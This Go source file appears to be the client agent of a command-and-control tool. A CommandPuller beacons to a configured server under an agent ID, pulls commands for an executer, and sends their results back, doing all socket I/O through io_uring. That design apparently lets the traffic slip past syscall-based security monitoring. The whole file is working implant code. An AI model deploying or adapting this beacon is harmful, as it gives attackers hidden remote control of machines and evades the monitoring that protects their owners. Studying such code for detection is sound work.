//go:build linux

package client

import (
	"context"
	"encoding/gob"
	"fmt"
	"io"
	"log/slog"
	"net"
	"sync"
	"syscall"
	"time"

	"github.com/amitschendel/curing/pkg/common"
	"github.com/amitschendel/curing/pkg/config"
	"github.com/iceber/iouring-go"
)

type CommandPuller struct {
	executer   IExecuter
	ring       *iouring.IOURing
	cfg        *config.Config
	resultChan chan iouring.Result
	ctx        context.Context
	cancelFunc context.CancelFunc
	interval   time.Duration
	closeOnce  sync.Once
}

func NewCommandPuller(cfg *config.Config, ctx context.Context, executer IExecuter) (*CommandPuller, error) {
	ring, err := iouring.New(32)
	if err != nil {
		return nil, err
	}

	ctx, cancel := context.WithCancel(ctx)
	return &CommandPuller{
		executer:   executer,
		ring:       ring,
		cfg:        cfg,
		ctx:        ctx,
		cancelFunc: cancel,
		resultChan: make(chan iouring.Result, 32),
		interval:   time.Duration(cfg.ConnectIntervalSec) * time.Second,
	}, nil
}

// SetInterval allows configuring the connection interval
func (cp *CommandPuller) SetInterval(d time.Duration) {
	cp.interval = d
}

func (cp *CommandPuller) Run() {
	ticker := time.NewTicker(cp.interval)
	defer ticker.Stop()

	slog.Info("Starting CommandPuller")
	cp.connectReadAndProcess()

	for {
		select {
		case <-cp.ctx.Done():
			cp.Close()
			return
		case <-ticker.C:
			cp.connectReadAndProcess()
		}
	}
}

func (cp *CommandPuller) connectReadAndProcess() {
	// Connect
	fd, err := cp.connect()
	if err != nil {
		slog.Error("Error connecting to server", "error", err)
		return
	}

	defer func() {
		if err := cp.close(fd); err != nil {
			slog.Error("Error closing connection", "error", err)
		}
	}()

	// Create UringRWer
	urw := &UringRWer{
		fd:         fd,
		resultChan: cp.resultChan,
		ring:       cp.ring,
	}

	// Send GetCommands request
	req := &common.Request{
		AgentID: cp.cfg.AgentID,
		Type:    common.GetCommands,
	}
	if err := cp.sendGobRequest(urw, req); err != nil {
		slog.Error("Error sending request", "error", err)
		return
	}

	// Read and decode commands with retries
	commands, err := cp.readGobCommands(urw)
	if err != nil {
		slog.Error("Error reading commands", "error", err)
		return
	}

	if len(commands) > 0 {
		cp.processCommands(commands)
	}
}

func (cp *CommandPuller) sendGobRequest(urw *UringRWer, req *common.Request) error {
	encoder := gob.NewEncoder(urw)
	if err := encoder.Encode(req); err != nil {
		return fmt.Errorf("failed to encode request: %w", err)
	}
	return nil
}

func (cp *CommandPuller) readGobCommands(urw *UringRWer) ([]common.Command, error) {
	// Try decoding immediately first
	decoder := gob.NewDecoder(urw)
	var commands []common.Command
	if err := decoder.Decode(&commands); err != nil {
		return nil, fmt.Errorf("failed to decode commands: %w", err)
	}
	return commands, nil
}

func (cp *CommandPuller) sendResults(urw *UringRWer, results []common.Result) error {
	req := &common.Request{
		AgentID: cp.cfg.AgentID,
		Type:    common.SendResults,
		Results: results,
	}
	return cp.sendGobRequest(urw, req)
}

func (cp *CommandPuller) processCommands(commands []common.Command) {
	commandChan := cp.executer.GetCommandChannel()
	outputChan := cp.executer.GetOutputChannel()

	for _, cmd := range commands {
		slog.Info("Sending command to executer", "command", cmd)
		select {
		case commandChan <- cmd:
			slog.Info("Command sent to executer", "command", cmd)
		case <-cp.ctx.Done():
			return
		}

		// Wait for result with timeout
		select {
		case result := <-outputChan:
			fd, err := cp.connect()
			if err != nil {
				slog.Error("Error connecting to send results", "error", err)
				continue
			}

			// Create UringRWer
			urw := &UringRWer{
				fd:         fd,
				resultChan: cp.resultChan,
				ring:       cp.ring,
			}

			if err := cp.sendResults(urw, []common.Result{result}); err != nil {
				slog.Error("Error sending results", "error", err)
			}

			cp.close(fd)
		case <-time.After(time.Second):
			slog.Info("No immediate result for command", "command", cmd)
		case <-cp.ctx.Done():
			return
		}
	}
}

// connect establishes a connection to the server
func (cp *CommandPuller) connect() (int, error) {
	host := cp.cfg.Server.Host
	port := cp.cfg.Server.Port

	// Normalize obvious aliases
	if host == "localhost" {
		host = "127.0.0.1"
	}

	// Resolve to a concrete IPv4 address
	var ip4 net.IP
	if ip := net.ParseIP(host); ip != nil {
		ip4 = ip.To4()
	}
	if ip4 == nil {
		ips, err := net.DefaultResolver.LookupIP(cp.ctx, "ip4", host)
		if err != nil || len(ips) == 0 {
			return -1, fmt.Errorf("resolve IPv4 for %q failed: %w", host, err)
		}
		ip4 = ips[0].To4()
		if ip4 == nil {
			return -1, fmt.Errorf("host %q has no A record", host)
		}
	}

	// Create IPv4 socket
	sockfd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	if err != nil {
		return -1, fmt.Errorf("socket(AF_INET): %w", err)
	}

	var addr4 [4]byte
	copy(addr4[:], ip4)

	// io_uring connect
	req, err := iouring.Connect(sockfd, &syscall.SockaddrInet4{
		Port: port,
		Addr: addr4,
	})
	if err != nil {
		syscall.Close(sockfd)
		return -1, fmt.Errorf("connect req: %w", err)
	}
	if _, err := cp.ring.SubmitRequest(req, cp.resultChan); err != nil {
		syscall.Close(sockfd)
		return -1, fmt.Errorf("connect submit: %w", err)
	}
	res := <-cp.resultChan
	if res.Err() != nil {
		syscall.Close(sockfd)
		return -1, fmt.Errorf("connect result: %w", res.Err())
	}

	slog.Info("Connected (IPv4)", "host", host, "ip", ip4.String(), "port", port, "sockfd", sockfd)
	return sockfd, nil
}

type UringRWer struct {
	fd         int
	resultChan chan iouring.Result
	ring       *iouring.IOURing
}

var _ io.Reader = (*UringRWer)(nil)
var _ io.Writer = (*UringRWer)(nil)

func (cp *UringRWer) Read(buf []byte) (int, error) {
	request := iouring.Read(cp.fd, buf)
	if _, err := cp.ring.SubmitRequest(request, cp.resultChan); err != nil {
		return -1, err
	}

	result := <-cp.resultChan
	if result.Err() != nil {
		return -1, result.Err()
	}

	n := result.ReturnValue0().(int)
	readBuf, _ := result.GetRequestBuffer()
	// Copy the data into the provided buffer
	copy(buf[:n], readBuf[:n])

	return n, nil
}

func (cp *UringRWer) Write(buf []byte) (int, error) {
	request := iouring.Write(cp.fd, buf)
	if _, err := cp.ring.SubmitRequest(request, cp.resultChan); err != nil {
		return -1, err
	}

	result := <-cp.resultChan
	if result.Err() != nil {
		return -1, result.Err()
	}

	n := result.ReturnValue0().(int)
	slog.Info("Wrote to file descriptor", "fd", cp.fd, "n", n)

	return n, nil
}

func (cp *CommandPuller) close(fd int) error {
	request := iouring.Close(fd)
	if _, err := cp.ring.SubmitRequest(request, cp.resultChan); err != nil {
		return err
	}

	result := <-cp.resultChan
	if result.Err() != nil {
		return result.Err()
	}

	slog.Info("Closed file descriptor", "fd", fd)
	return nil
}

func (cp *CommandPuller) Close() {
	cp.closeOnce.Do(func() {
		slog.Info("Closing CommandPuller")
		cp.cancelFunc()

		// Add a small delay to allow pending operations to complete
		time.Sleep(50 * time.Millisecond)

		if cp.ring != nil {
			_ = cp.ring.Close()
		}

		close(cp.resultChan)
		slog.Info("CommandPuller closed")
	})
}
